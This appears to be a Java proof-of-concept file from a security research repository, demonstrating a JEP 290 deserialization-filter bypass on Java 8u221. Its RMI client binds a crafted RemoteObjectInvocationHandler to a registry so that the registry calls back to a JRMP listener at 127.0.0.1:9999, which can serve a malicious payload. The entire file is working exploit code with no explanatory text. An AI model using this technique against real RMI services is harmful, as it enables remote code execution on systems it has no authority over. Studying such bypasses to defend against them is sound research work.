package org.h3rmesk1t.JEP290.bypass8u221;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/4 2:15 上午
 */
public class RMIClient {

    public static void main(String[] args) throws RemoteException, AlreadyBoundException {

        Registry registry = LocateRegistry.getRegistry(2222);
        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 9999);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        registry.bind("demo", obj);
    }
}
